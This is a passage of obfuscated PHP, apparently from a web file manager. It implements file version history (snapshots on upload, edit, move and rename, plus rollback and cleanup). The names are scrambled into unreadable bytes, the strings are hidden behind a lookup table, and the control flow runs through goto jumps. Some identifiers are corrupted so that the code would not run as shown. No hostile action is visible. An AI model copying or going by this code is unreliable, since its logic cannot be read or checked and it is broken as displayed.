show_json($b¨¸µ‘¦Á÷[$A“óÉ¬šö[1064]], !1); } goto Dè‹ˆˆ÷Ó; F†ùŒù¬…ô: $DÖ’‹ïæÀˆ = self::info($bÚÍ‹£ƒÍ§); $FäæøÈÉ = self::fileExt($DÖ’‹ïæÀˆ); $D¦Äâ‰‹õö = self::tmpFileName($DÖ’‹ïæÀˆ); goto D…À×¼²Ñ«; E‘Éê‹Š‰: } private static function fileExt($E‹šÈ–³ó) { $CŸø˜£äËŠ =& $_SERVER[Š‰]; $F»ó¶Àâ = $E‹šÈ–³ó[$CŸø˜£äËŠ[167]]; if ($F»ó¶Àâ == $CŸø˜£äËŠ[1071]) { $CÅ±êó¸İİ = $CŸø˜£äËŠ[1072]; if (substr($E‹šÈ–³ó[$CŸø˜£äËŠ[28]], -strlen($CÅ±êó¸İİ)) == $CÅ±êó¸İİ) { $F»ó¶Àâ = $CŸø˜£äËŠ[1073]; } } self::archiveExt($F»ó¶Àâ); return $F»ó¶Àâ; } private static function zipFileList($FÔ¼´‘ª, $F¯¹“Æ¶˜Û = false) { $CÌŠòŒŠÖ„ =& $_SERVER[Š‰]; $dï¾ÎÚîŸ = array(); foreach ($FÔ¼´‘ª as $Bá—Ä¶‡²) { $FÇÈ„¡Ù† = $Bá—Ä¶‡²[$CÌŠòŒŠÖ„[75]]; if ($F¯¹“Æ¶˜Û) { $FÇÈ„¡Ù† = self::copy($Bá—Ä¶‡²[$CÌŠòŒŠÖ„[75]], $F¯¹“Æ¶˜Û, $CÌŠòŒŠÖ„[769]); } else { $a¦ê‘¶ÄÁ» = self::init($Bá—Ä¶‡²[$CÌŠòŒŠÖ„[75]]); if ($a¦ê‘¶ÄÁ»->getType() == $CÌŠòŒŠÖ„[105]) { $FÇÈ„¡Ù† = $a¦ê‘¶ÄÁ»->path; } } if ($FÇÈ„¡Ù† && self::local()->exist($FÇÈ„¡Ù†)) { $dï¾ÎÚîŸ[$Bá—Ä¶‡²[$CÌŠòŒŠÖ„[75]]] = $FÇÈ„¡Ù†; } } if (!empty($dï¾ÎÚîŸ)) { return array_values($dï¾ÎÚîŸ); } show_json(LNG($CÌŠòŒŠÖ„[1037]), !1); } public static function tmpFileName($EÄéæ—Õªæ) { $f¢ø”¬åˆ =& $_SERVER[Š‰]; $bªŒİê†Š¿ = array($EÄéæ—Õªæ[$f¢ø”¬åˆ[28]], $EÄéæ—Õªæ[$f¢ø”¬åˆ[75]], $EÄéæ—Õªæ[$f¢ø”¬åˆ[77]], $EÄéæ—Õªæ[$f¢ø”¬åˆ[481]]); return md5(implode($f¢ø”¬åˆ[70], $bªŒİê†Š¿)); } private static function localFilePath($CÕ³•Š¶ö…, $A’ˆö¤‡¡“) { goto eŒäÎ—’§£; FñÕª’µÚ£: if ($c¤ˆ®¼°„[$bÒ£Œ²˜Š[29]] == KodIO::KOD_SOURCE) { $EÒ°¤ÏÇ“Ë = Model($bÒ£Œ²˜Š[775])->fileInfoGet(KodIO::sourceID($CÕ³•Š¶ö…)); if (!$EÒ°¤ÏÇ“Ë[$bÒ£Œ²˜Š[75]]) { show_json($bÒ£Œ²˜Š[1076], !1); } $CÕ³•Š¶ö… = $EÒ°¤ÏÇ“Ë[$bÒ£Œ²˜Š[75]]; } $C‰“Ä©é…‹ = self::init($CÕ³•Š¶ö…); $F»çƒƒ¤ª· = $C‰“Ä©é…‹->getType(); goto E¯ÜŠ¾·‡; E¯ÜŠ¾·‡: if ($F»çƒƒ¤ª· == $bÒ£Œ²˜Š[105] || $F»çƒƒ¤ª· == $bÒ£Œ²˜Š[1077]) { if (!$C‰“Ä©é…‹->exist($C‰“Ä©é…‹->path)) { show_json(LNG($bÒ£Œ²˜Š[104]), !1); } return $C‰“Ä©é…‹->path; } return !1; goto aëêß‰Õ‚è; eŒäÎ—’§£: $bÒ£Œ²˜Š =& $_SERVER[Š‰]; if ($A’ˆö¤‡¡“ == $bÒ£Œ²˜Š[1074] && strtoupper(substr(PHP_OS, 0, 3)) == $bÒ£Œ²˜Š[1075]) { return !1; } $c¤ˆ®¼°„ = KodIO::parse($CÕ³•Š¶ö…); goto FñÕª’µÚ£; aëêß‰Õ‚è: } private static function archiveExt($aÃÇ°‰îšÉ = '') { $GLOBALS[$_SERVER[Š‰][1078]] = $aÃÇ°‰îšÉ; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto eÄ§‰È‚×Å; EŠ¯×¨¡øÅ: Hook::bind($AôÄšîÎ¦ø[1085], $AôÄšîÎ¦ø[1086]); Hook::bind($AôÄšîÎ¦ø[1087], $AôÄšîÎ¦ø[1088]); Hook::bind($AôÄšîÎ¦ø[1089], $AôÄšîÎ¦ø[1090]); goto f±£Ô…™íÀ; eÄ§‰È‚×Å: $AôÄšîÎ¦ø =& $_SERVER[Š‰]; $B‚Åâ¿ùÆ = $GLOBALS[$AôÄšîÎ¦ø[6]][$AôÄšîÎ¦ø[87]][$AôÄšîÎ¦ø[1079]]; if ($B‚Åâ¿ùÆ <= 0) { return; } goto C•ô®¾õä‡; f±£Ô…™íÀ: Hook::bind($AôÄšîÎ¦ø[1091], $AôÄšîÎ¦ø[1092]); goto b½…ÑÌËº„; C•ô®¾õä‡: if (isset($_REQUEST[$AôÄšîÎ¦ø[1080]]) && $_REQUEST[$AôÄšîÎ¦ø[1080]] == $AôÄšîÎ¦ø[86]) { return; } Hook::bind($AôÄšîÎ¦ø[1081], $AôÄšîÎ¦ø[1082]); Hook::bind($AôÄšîÎ¦ø[1083], $AôÄšîÎ¦ø[1084]); goto EŠ¯×¨¡øÅ; b½…ÑÌËº„: } public static function eventBeforeUpload($Aòºª‘ÑÛé) { if ($Aòºª‘ÑÛé[3] && $Aòºª‘ÑÛé[3] != REPEAT_REPLACE) { return; } $fÁ¯˜Ñéô = self::parsePath($Aòºª‘ÑÛé[0]); if (!$fÁ¯˜Ñéô) { return; } self::add($fÁ¯˜Ñéô); } public static function eventBeforeEdit($cŒñ±³ÍÚ®) { $EÙáŞÚË•ã = self::parsePath($cŒñ±³ÍÚ®[0]); if (!$EÙáŞÚË•ã) { return; } self::add($EÙáŞÚË•ã); } public static function eventBeforeCopyFile($c†¥ÆÕ§Ó‹, $Fº¸åØÇ†³, $b¦á™øğ‘è, $c³±–ß, $D¸ô‡“‚ù, $a™· ÆÕÊæ) { $aùá½—Êë = $b¦á™øğ‘è->getPathOuter($c³±–ß); $f£²Àçßì = self::parsePath($aùá½—Êë); if (!$f£²Àçßì) { return; } self::add($f£²Àçßì); } public static function eventBeforeRename($fÏÕ¨‚’í) { $bùÈÙÍ×œÛ =& $_SERVER[Š‰]; $c“ÏëÀğ… = self::parsePath($fÏÕ¨‚’í[0]); if (!$c“ÏëÀğ…) { return; } $DµßÓŒ¯âİ = self::checkInHistory($c“ÏëÀğ…); if (!$DµßÓŒ¯âİ) { return; } if ($DµßÓŒ¯âİ[$bùÈÙÍ×œÛ[29]] == $bùÈÙÍ×œÛ[173]) { $eÔŸ²¥Ì‘Â = self::listData($c“ÏëÀğ…); if ($eÔŸ²¥Ì‘Â && $eÔŸ²¥Ì‘Â[$bùÈÙÍ×œÛ[365]]) { self::moveHistory($c“ÏëÀğ…, $fÏÕ¨‚’í[1]); } } else { IO::rename($DµßÓŒ¯âİ[$bùÈÙÍ×œÛ[75]], $fÏÕ¨‚’í[1]); } } public static function eventBeforeMove($eÈ–è±£) { goto Fêâ¨ˆòò‘; Eóõ³…­æÁ: $cÚ«ª ÓÏ¯ = self::parsePath($eÈ–è±£[1]); if (!$cÚ«ª ÓÏ¯) { return; } $E¯–àéÕ¥ì = $eÈ–è±£[3]; goto b¢½·óÀîâ; Fêâ¨ˆòò‘: $bÜ§ñàè‘ =& $_SERVER[Š‰]; $c–¬µĞæÇµ = self::parsePath($eÈ–è±£[0]); if (!$c–¬µĞæÇµ) { return; } goto Eóõ³…­æÁ; b¢½·óÀîâ: $f¸‰¡âÃŠê = self::checkInHistory($c–¬µĞæÇµ); if (!$f¸‰¡âÃŠê) { return; } $dóÙ¾Ñ‘¶ = self::pathHistory($cÚ«ª ÓÏ¯); goto DÇ­ÚµÙï¸; DÇ­ÚµÙï¸: if ($f¸‰¡âÃŠê[$bÜ§ñàè‘[29]] == $bÜ§ñàè‘[173]) { $Dé™å·İ™ê = self::listData($c–¬µĞæÇµ); $C÷¹Ôİ÷®ğ = rtrim($cÚ«ª ÓÏ¯, $bÜ§ñàè‘[8]) . $bÜ§ñàè‘[8] . ($E¯–àéÕ¥ì ? $E¯–àéÕ¥ì : get_path_this($c–¬µĞæÇµ)); $D½©Ü¿Ü— = self::listData($C÷¹Ôİ÷®ğ); if ($Dé™å·İ™ê && $Dé™å·İ™ê[$bÜ§ñàè‘[365]] && $D½©Ü¿Ü— && $D½©Ü¿Ü—[$bÜ§ñàè‘[365]]) { return self::clear($c–¬µĞæÇµ); } if ($Dé™å·İ™ê && $Dé™å·İ™ê[$bÜ§ñàè‘[365]]) { self::moveHistory($c–¬µĞæÇµ, $E¯–àéÕ¥ì, $dóÙ¾Ñ‘¶); } } else { IO::move($f¸‰¡âÃŠê[$bÜ§ñàè‘[75]], $dóÙ¾Ñ‘¶, !1, $E¯–àéÕ¥ì); self::clearEmptyFolder(IO::pathFather($f¸‰¡âÃŠê[$bÜ§ñàè‘[75]])); } goto A½‰ÛÑ…Å—; A½‰ÛÑ…Å—: } public static function eventAfterRemove($dÓÓÌÕ¥¿Ú, $dŠçˆŠùËê) { goto b…ƒ³ÂÛ³‰; aˆÚ×ù„å·: if (!$dõÜŸÁ·¯) { return; } $cËß‹ß‡Ğ = self::checkInHistory($dõÜŸÁ·¯); if (!$cËß‹ß‡Ğ) { return; } goto A¯¾Î‡‹Èš; A¯¾Î‡‹Èš: if ($cËß‹ß‡Ğ[$fïÕÏØÒï¾[29]] == $fïÕÏØÒï¾[173]) { $BŒöØé‡œ = self::listData($dõÜŸÁ·¯, !1); if ($BŒöØé‡œ && $BŒöØé‡œ[$fïÕÏØÒï¾[365]]) { self::clear($dõÜŸÁ·¯, !1); } } else { IO::remove($cËß‹ß‡Ğ[$fïÕÏØÒï¾[75]]); self::clearEmptyFolder(IO::pathFather($cËß‹ß‡Ğ[$fïÕÏØÒï¾[75]])); } goto EÙğÒ¨Æë; b…ƒ³ÂÛ³‰: $fïÕÏØÒï¾ =& $_SERVER[Š‰]; if (!$dŠçˆŠùËê) { return; } $dõÜŸÁ·¯ = self::parsePath($dÓÓÌÕ¥¿Ú[0]); goto aˆÚ×ù„å·; EÙğÒ¨Æë: } private static function checkInHistory($F— ™ØÚà) { $aÁÏ’µù•ã = self::pathHistory($F— ™ØÚà); if (!IO::exist($aÁÏ’µù•ã)) { $aÁÏ’µù•ã .= $_SERVER[Š‰][1093]; } return IO::exist($aÁÏ’µù•ã) ? IO::info($aÁÏ’µù•ã) : !1; } private static function parsePath($C¯Û¿œõ’Â) { goto fÂ¼Ã©¦®‘; fÂ¼Ã©¦®‘: $FÄ–ØÂ‰Æ =& $_SERVER[Š‰]; if (!$C¯Û¿œõ’Â) { return !1; } if ($GLOBALS[$FÄ–ØÂ‰Æ[1094]]) { return; } goto bäÍÄ£‰‹; A²ÉÃŞ¾­: return $C¯Û¿œõ’Â; goto f«¨…œæ¡è; bäÍÄ£‰‹: $Fˆ“ÂØ—Ùš = KodIO::parse($C¯Û¿œõ’Â); $E®ÈÁ°¸‹ = $Fˆ“ÂØ—Ùš[$FÄ–ØÂ‰Æ[29]]; $d‡ÓØÈÅöØ = !$E®ÈÁ°¸‹ || $E®ÈÁ°¸‹ == KodIO::KOD_IO || $E®ÈÁ°¸‹ == KodIO::KOD_SHARE_ITEM; goto bÀÆĞæê; BÂ³ë“Ä­³: $C´µïã¦â = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $FÄ–ØÂ‰Æ[1096]); foreach ($C´µïã¦â as $FÏµãå¨Í†) { if (!$E®ÈÁ°¸‹ && substr($C¯Û¿œõ’Â, 0, strlen($FÏµãå¨Í†)) == $FÏµãå¨Í†) { return !1; } } self::log($GLOBALS[$FÄ–ØÂ‰Æ[1019]] . $FÄ–ØÂ‰Æ[1097] . $C¯Û¿œõ’Â); goto A²ÉÃŞ¾­; bÀÆĞæê: if (!$d‡ÓØÈÅöØ || !$Fˆ“ÂØ—Ùš[$FÄ–ØÂ‰Æ[1095]]) { return !1; } if ($E®ÈÁ°¸‹ == KodIO::KOD_SHARE_ITEM) { $dÎÑçàƒ = IO::init($C¯Û¿œõ’Â); if ($dÎÑçàƒ->pathParse[$FÄ–ØÂ‰Æ[1024]]) { return self::parsePath($dÎÑçàƒ->pathParse[$FÄ–ØÂ‰Æ[1024]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto BÂ³ë“Ä­³; f«¨…œæ¡è: } private static function pathHistory($fİÚˆßöÙ) { $cßà»Ø‚êÑ =& $_SERVER[Š‰]; $CœôÃõá°‹ = self::$_historyBase . ltrim(KodIO::clear($fİÚˆßöÙ), $cßà»Ø‚êÑ[8]); $CœôÃõá°‹ = str_replace(array($cßà»Ø‚êÑ[1098]), array($cßà»Ø‚êÑ[1099]), $CœôÃõá°‹); return $CœôÃõá°‹; } public static function log($AİùÏ¾Ü„î) { } public static function historyCount($Eœâ´¡¹Å‹) { $CÏÓí³“ =& $_SERVER[Š‰]; $fÁ²¯²Îä = array(); $b½ØÄ‹ö›§ = array(); foreach ($Eœâ´¡¹Å‹ as $b‚ñ÷Ê«¦«) { $B‡‡ŞÑ¸Êµ = get_path_father($b‚ñ÷Ê«¦«); if (!$b½ØÄ‹ö›§[$B‡‡ŞÑ¸Êµ]) { $b½ØÄ‹ö›§[$B‡‡ŞÑ¸Êµ] = array(); } $b½ØÄ‹ö›§[$B‡‡ŞÑ¸Êµ][] = get_path_this($b‚ñ÷Ê«¦«); } foreach ($b½ØÄ‹ö›§ as $B‡‡ŞÑ¸Êµ => $dùˆ†ÌÜ‘) { $cÀ¹ƒì•à = self::parsePath($B‡‡ŞÑ¸Êµ); if (!$cÀ¹ƒì•à) { continue; } foreach ($dùˆ†ÌÜ‘ as $FˆÖ…¯ªÈî) { $e¤ãÒãÍŞ× = self::listData(rtrim($cÀ¹ƒì•à, $CÏÓí³“[8]) . $CÏÓí³“[8] . $FˆÖ…¯ªÈî, !1); if ($e¤ãÒãÍŞ× && $e¤ãÒãÍŞ×[$CÏÓí³“[365]]) { $fÁ²¯²Îä[rtrim($B‡‡ŞÑ¸Êµ, $CÏÓí³“[8]) . $CÏÓí³“[8] . $FˆÖ…¯ªÈî] = count($e¤ãÒãÍŞ×[$CÏÓí³“[365]]); } } } return $fÁ²¯²Îä; } public static function add($FÀŒÙ éÕ°) { goto eê§¯ô„ØË; CŞ‚ÍŸ Â: $eòÁáï‡©ñ = $C†èåÁ›‘[$cí“ì§ñÖ[365]]; if ($FÉ£é£‰¡Ğ[$cí“ì§ñÖ[77]] == 0) { return; } if ($FÉ£é£‰¡Ğ[$cí“ì§ñÖ[77]] >= 1024 * 1024 * 500) { return !1; } goto E…¹¯ğåÎ; añ™¿®‹©: return self::saveData($C†èåÁ›‘[$cí“ì§ñÖ[1106]], $eòÁáï‡©ñ); goto dİŠµÄˆÜ§; dßŞîŸÅ…½: $e¯°ŞöÃÚÆ = array($cí“ì§ñÖ[388] => $bàæ‹¬æô¬, $cí“ì§ñÖ[170] => $B¦©Ë×Œ¯Ø, $cí“ì§ñÖ[28] => $FÉ£é£‰¡Ğ[$cí“ì§ñÖ[28]] . $cí“ì§ñÖ[94] . date($cí“ì§ñÖ[1103]) . rand_string(1), $cí“ì§ñÖ[77] => $FÉ£é£‰¡Ğ[$cí“ì§ñÖ[77]], $cí“ì§ñÖ[426] => USER_ID, $cí“ì§ñÖ[192] => time(), $cí“ì§ñÖ[1104] => $cí“ì§ñÖ[33]); IO::mkdir($C†èåÁ›‘[$cí“ì§ñÖ[1105]]); $cêÖ²­óï“ = IO::copy($FÀŒÙ éÕ°, $C†èåÁ›‘[$cí“ì§ñÖ[1105]], !1, $e¯°ŞöÃÚÆ[$cí“ì§ñÖ[28]]); goto bùî…Ú™«Ş; eê§¯ô„ØË: $cí“ì§ñÖ =& $_SERVER[Š‰]; $C†èåÁ›‘ = self::listData($FÀŒÙ éÕ°); if (!$C†èåÁ›‘) { return; } goto B´ªìÄŠ¬Ö; bùî…Ú™«Ş: if (!$cêÖ²­óï“) { self::clearEmptyFolder($C†èåÁ›‘[$cí“ì§ñÖ[1105]]); return !1; } array_unshift($eòÁáï‡©ñ, $e¯°ŞöÃÚÆ); if (count($eòÁáï‡©ñ) > $dË»´§¸”) { $CéÜö°Àù = array_slice($eòÁáï‡©ñ, $dË»´§¸”); foreach ($CéÜö°Àù as $DùÕƒóƒ÷Í) { IO::remove($C†èåÁ›‘[$cí“ì§ñÖ[1105]] . $DùÕƒóƒ÷Í[$cí“ì§ñÖ[28]]); } $eòÁáï‡©ñ = array_slice($eòÁáï‡©ñ, 0, $dË»´§¸”); } goto añ™¿®‹©; B´ªìÄŠ¬Ö: $fÎêÄéØñ = Model($cí“ì§ñÖ[1100])->get($cí“ì§ñÖ[1101]); $Eì¨œ—È‹¦ = $GLOBALS[$cí“ì§ñÖ[6]][$cí“ì§ñÖ[87]][$cí“ì§ñÖ[1079]]; $dË»´§¸” = $fÎêÄéØñ == $cí“ì§ñÖ[1102] ? 5 : $Eì¨œ—È‹¦; goto C­à›ğ·•; E…¹¯ğåÎ: if ($eòÁáï‡©ñ && $eòÁáï‡©ñ[0][$cí“ì§ñÖ[170]] == $B¦©Ë×Œ¯Ø) { return !0; } if (array_key_exists($cí“ì§ñÖ[194], $FÉ£é£‰¡Ğ) && !$FÉ£é£‰¡Ğ[$cí“ì§ñÖ[194]]) { return !1; } $bàæ‹¬æô¬ = short_id(time()); goto dßŞîŸÅ…½; C­à›ğ·•: if ($Eì¨œ—È‹¦ <= 0) { return; } $B¦©Ë×Œ¯Ø = IO::hashSimple($FÀŒÙ éÕ°); $FÉ£é£‰¡Ğ = IO::info($FÀŒÙ éÕ°); goto CŞ‚ÍŸ Â; dİŠµÄˆÜ§: } public static function remove($eÁöˆÌğ›¹, $e›¹‡‰ñÓñ) { $Aø´–É· =& $_SERVER[Š‰]; $CÏŒôŞ²é = self::listData($eÁöˆÌğ›¹); $a×·Üàë = array(); if (!$CÏŒôŞ²é) { return !1; } foreach ($CÏŒôŞ²é[$Aø´–É·[365]] as $BÅÀÚª‘Ê¥) { if ($BÅÀÚª‘Ê¥[$Aø´–É·[388]] == $e›¹‡‰ñÓñ) { IO::remove($CÏŒôŞ²é[$Aø´–É·[1105]] . $BÅÀÚª‘Ê¥[$Aø´–É·[28]]); continue; } $a×·Üàë[] = $BÅÀÚª‘Ê¥; } return self::saveData($CÏŒôŞ²é[$Aø´–É·[1106]], $a×·Üàë); } public static function clear($Cßœó¹ˆ¼ã, $aÎÌ×¦§š” = true) { $Cİ¦ÔÌ¤â¸ =& $_SERVER[Š‰]; $dØÁ±Ô’òù = self::listData($Cßœó¹ˆ¼ã, $aÎÌ×¦§š”); if (!$dØÁ±Ô’òù) { return !1; } foreach ($dØÁ±Ô’òù[$Cİ¦ÔÌ¤â¸[365]] as $D£”–ïî¿¶) { IO::remove($dØÁ±Ô’òù[$Cİ¦ÔÌ¤â¸[1105]] . $D£”–ïî¿¶[$Cİ¦ÔÌ¤â¸[28]]); } return self::saveData($dØÁ±Ô’òù[$Cİ¦ÔÌ¤â¸[1106]], array()); } public static function moveHistory($eôáíÎíñ, $eÕã¹’ğÀË = '', $BóĞ´ä£ÚÕ = '') { goto C©ƒğ¯®æÓ; fí¸´š¾: self::saveData($e±¾ÆãåË[$BÁ ğ…›è²[1106]], $e±¾ÆãåË[$BÁ ğ…›è²[365]]); self::clearEmptyFolder($e±¾ÆãåË[$BÁ ğ…›è²[1105]]); goto F­Ä³é®‡; C©ƒğ¯®æÓ: $BÁ ğ…›è² =& $_SERVER[Š‰]; $e±¾ÆãåË = self::listData($eôáíÎíñ, !1); if (!$e±¾ÆãåË || !$e±¾ÆãåË[$BÁ ğ…›è²[365]]) { return !1; } goto A˜ˆô§È³Ğ; BÊ“Û‹š…µ: $fâä¢ƒïÑ = substr(get_path_this($e±¾ÆãåË[$BÁ ğ…›è²[1106]]), 0, -strlen($D‰·ë‡æÎ)); foreach ($e±¾ÆãåË[$BÁ ğ…›è²[365]] as $CøÓ›ê‘† => $F šƒÏÄáù) { $FªÀƒĞÅÚí = $eÕã¹’ğÀË . substr($F šƒÏÄáù[$BÁ ğ…›è²[28]], strlen($fâä¢ƒïÑ)); $eî¸æøä = IO::move($e±¾ÆãåË[$BÁ ğ…›è²[1105]] . $F šƒÏÄáù[$BÁ ğ…›è²[28]], $BóĞ´ä£ÚÕ, !1, $FªÀƒĞÅÚí); if ($eî¸æøä) { $e±¾ÆãåË[$BÁ ğ…›è²[365]][$CøÓ›ê‘†][$BÁ ğ…›è²[28]] = $FªÀƒĞÅÚí; } } $e±¾ÆãåË[$BÁ ğ…›è²[1106]] = IO::move($e±¾ÆãåË[$BÁ ğ…›è²[1106]], $BóĞ´ä£ÚÕ, !1, $eÕã¹’ğÀË . $D‰·ë‡æÎ); goto fí¸´š¾; A˜ˆô§È³Ğ: $D‰·ë‡æÎ = $BÁ ğ…›è²[1093]; $eÕã¹’ğÀË = $eÕã¹’ğÀË ? $eÕã¹’ğÀË : get_path_this($eôáíÎíñ); $BóĞ´ä£ÚÕ = $BóĞ´ä£ÚÕ ? $BóĞ´ä£ÚÕ : $e±¾ÆãåË[$BÁ ğ…›è²[1105]]; goto BÊ“Û‹š…µ; F­Ä³é®‡: } public static function rollback($F¯†ùºÛ¬Ã, $B•ˆÕ¾×²½) { $aİ‰ÌˆÎßï =& $_SERVER[Š‰]; $F¯ÒÏ·Ìé¢ = self::listData($F¯†ùºÛ¬Ã); if (!$F¯ÒÏ·Ìé¢) { return; } $Dğ»•†«¶Ì = IO::info($F¯†ùºÛ¬Ã); foreach ($F¯ÒÏ·Ìé¢[$aİ‰ÌˆÎßï[365]] as $b¾ˆ˜çÊ => $e¡ˆ–òĞÖ–) { if ($e¡ˆ–òĞÖ–[$aİ‰ÌˆÎßï[388]] == $B•ˆÕ¾×²½) { self::add($F¯†ùºÛ¬Ã); $c‹À‰™‘À = $F¯ÒÏ·Ìé¢[$aİ‰ÌˆÎßï[1105]] . $e¡ˆ–òĞÖ–[$aİ‰ÌˆÎßï[28]]; $c­‡ÙîÀ¼ = IO::copy($c‹À‰™‘À, IO::pathFather($F¯†ùºÛ¬Ã), REPEAT_REPLACE, $Dğ»•†«¶Ì[$aİ‰ÌˆÎßï[28]]); if ($c­‡ÙîÀ¼) { self::remove($F¯†ùºÛ¬Ã, $B•ˆÕ¾×²½); } return $c­‡ÙîÀ¼; } } return !1; } public static function setDetail($C‹å”ÁÃ  , $CÎ³®˜««ì, $CÕ¦÷¢ôª) { $E½ ¢à©Ôµ =& $_SERVER[Š‰]; $eÑí˜²…¿à = self::listData($C‹å”ÁÃ  ); if (!$eÑí˜²…¿à) { return; } foreach ($eÑí˜²…¿à[$E½ ¢à©Ôµ[365]] as $a½«»¾Œ­ => $f¶£«ŠÇÕŞ) { if ($f¶£«ŠÇÕŞ[$E½ ¢à©Ôµ[388]] == $CÎ³®˜««ì) { $eÑí˜²…¿à[$E½ ¢à©Ôµ[365]][$a½«»¾Œ­][$E½ ¢à©Ôµ[1104]] = $CÕ¦÷¢ôª; self::saveData($eÑí˜²…¿à[$E½ ¢à©Ôµ[1106]], $eÑí˜²…¿à[$E½ ¢à©Ôµ[365]]); return !0; } } return !1; } public static function fileInfo($A‡à¯ƒÏÛò, $C÷éÈÚƒ‘°) { goto AœƒÒ†½°õ; AœƒÒ†½°õ: $AàßÅŞœô¬ =& $_SERVER[Š‰]; $F´œ’ÙªÜ = self::listData($A‡à¯ƒÏÛò); if (!$F´œ’ÙªÜ) { show_json(LNG($AàßÅŞœô¬[104]), !1); } goto AÔØ´†èƒÍ; F‡ˆ¡õ‚÷: return IO::info($cˆøí¨Û½·); goto Aù…• °·; AÔØ´†èƒÍ: $cˆøí¨Û½· = $AàßÅŞœô¬[33]; foreach ($F´œ’ÙªÜ[$AàßÅŞœô¬[365]] as $F»»Ù×îš‡ => $D¤ÒÚäĞ•) { if ($D¤ÒÚäĞ•[$AàßÅŞœô¬[388]] != $C÷éÈÚƒ‘°) { continue; } $cˆøí¨Û½· = $F´œ’ÙªÜ[$AàßÅŞœô¬[1105]] . $D¤ÒÚäĞ•[$AàßÅŞœô¬[28]]; break; } if (!$cˆøí¨Û½·) { show_json(LNG($AàßÅŞœô¬[104]), !1); } goto F‡ˆ¡õ‚÷; Aù…• °·: } public static function fileOut($f‡Œä÷ñ‰’, $FøÍç•ù¾à, $B™íîŸ ·‹ = false) { $C×’§‚Ñø =& $_SERVER[Š‰]; $Eà‰èğãøñ = self::fileInfo($f‡Œä÷ñ‰’, $FøÍç•ù¾à); $E¥¨´äèƒ =& $GLOBALS[$C×’§‚Ñø[7]]; $B™íîŸ ·‹ = isset($E¥¨´äèƒ[$C×’§‚Ñø[1070]]) && $E¥¨´äèƒ[$C×’§‚Ñø[1070]] == 1; if (isset($E¥¨´äèƒ[$C×’§‚Ñø[29]]) && $E¥¨´äèƒ[$C×’§‚Ñø[29]] == $C×’§‚Ñø[1107]) { return IO::fileOutImage($Eà‰èğãøñ[$C×’§‚Ñø[75]], $E¥¨´äèƒ[$C×’§‚Ñø[1108]]); } IO::fileOut($Eà‰èğãøñ[$C×’§‚Ñø[75]], $B™íîŸ ·‹, get_path_this($f‡Œä÷ñ‰’)); } public static function listData($càãùÏ², $D²÷¶Ó•í = true) { goto dôÅëòòÙ¢; dôÅëòòÙ¢: $cëÀĞ¤ Ò =& $_SERVER[Š‰]; if ($D²÷¶Ó•í && !IO::exist($càãùÏ²)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto D¸ä·Çé¤†; AšŞ‘µÆ: $dğö¢ãÆø‚ = IO::getContent($e˜Èö‰øŒİ[$cëÀĞ¤ Ò[1106]]); if ($dğö¢ãÆø‚) { $D£¬½‰ÓÛ– = json_decode($dğö¢ãÆø‚, !0); if (is_array($D£¬½‰ÓÛ–)) { $e˜Èö‰øŒİ[$cëÀĞ¤ Ò[365]] = $D£¬½‰ÓÛ–; } } return $e˜Èö‰øŒİ; goto b•Á¥¼ˆÀ÷; D¸ä·Çé¤†: if (substr($càãùÏ², 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $bšÊòäš = self::pathHistory($càãùÏ²); $e˜Èö‰øŒİ = array($cëÀĞ¤ Ò[1106] => $bšÊòäš . $cëÀĞ¤ Ò[1093], $cëÀĞ¤ Ò[1105] => rtrim(get_path_father($bšÊòäš), $cëÀĞ¤ Ò[8]) . $cëÀĞ¤ Ò[8], $cëÀĞ¤ Ò[365] => array()); goto AšŞ‘µÆ; b•Á¥¼ˆÀ÷: } private static function saveData($dÎÔ‡á×Ï, $A¦á¬ùÑƒ) { goto bßŒ©”´Á«; fÜÈ¦›ß´¤: $D†‰Ù‘„îÅ = IO::pathFather($dÎÔ‡á×Ï); IO::remove($dÎÔ‡á×Ï); self::clearEmptyFolder($D†‰Ù‘„îÅ); goto dŞŸ©İ; dŞŸ©İ: return !0; goto bˆ÷£ÏÓÉ; bßŒ©”´Á«: $c…’Ü¾§Çï =& $_SERVER[Š‰]; self::log($c…’Ü¾§Çï[1109] . $dÎÔ‡á×Ï . $c…’Ü¾§Çï[67] . count($A¦á¬ùÑƒ), $c…’Ü¾§Çï[704]); if ($A¦á¬ùÑƒ) { return IO::setContent($dÎÔ‡á×Ï, json_encode($A¦á¬ùÑƒ)); } goto fÜÈ¦›ß´¤; bˆ÷£ÏÓÉ: } public static function clearEmptyFolder($f±İö²ßôİ) { goto C›ÃŞÈ±„—; bîìÖ³º‡ö: self::clearEmptyFolder($f‡Ê½Â¶‡); goto AïÔµÄØÇ’; C›ÃŞÈ±„—: $Aò¦¾‹ÅÚÌ =& $_SERVER[Š‰]; if (trim($f±İö²ßôİ, $Aò¦¾‹ÅÚÌ[8]) == trim(self::$_historyBase, $Aò¦¾‹ÅÚÌ[8])) { return; } $f‡Ê½Â¶‡ = IO::pathFather($f±İö²ßôİ); goto E†´’ô‹Ã; E†´’ô‹Ã: $cÉ²¶äùŞ² = IO::has($f±İö²ßôİ, !0); if ($cÉ²¶äùŞ²[$Aò¦¾‹ÅÚÌ[201]] > 0 || $cÉ²¶äùŞ²[$Aò¦¾‹ÅÚÌ[202]] > 0) { return; } IO::remove($f±İö²ßôİ); goto bîìÖ³º‡ö; AïÔµÄØÇ’: } private static function getBasePath() { goto C¼­›¹Ú©Ë; C¼­›¹Ú©Ë: $b­ÕçéĞæŠ =& $_SERVER[Š‰]; $fÃ…¾‹Ø„¡ = Model($b­ÕçéĞæŠ[1110])->get($b­ÕçéĞæŠ[1111]); if (IO::exist($fÃ…¾‹Ø„¡)) { return $fÃ…¾‹Ø„¡; } goto C¶î÷ÚİÅ¨; C¶î÷ÚİÅ¨: $fÃ…¾‹Ø„¡ = DATA_PATH . $b­ÕçéĞæŠ[1112]; $fÃ…¾‹Ø„¡ = IO::mkdir($fÃ…¾‹Ø„¡); $fÃ…¾‹Ø„¡ = rtrim($fÃ…¾‹Ø„¡, $b­ÕçéĞæŠ[8]) . $b­ÕçéĞæŠ[8]; goto d‡µÈ³‰½Ş; d‡µÈ³‰½Ş: file_put_contents($fÃ…¾‹Ø„¡ . $b­ÕçéĞæŠ[1113], $b­ÕçéĞæŠ[33]); Model($b­ÕçéĞæŠ[1110])->set($b­ÕçéĞæŠ[1111], 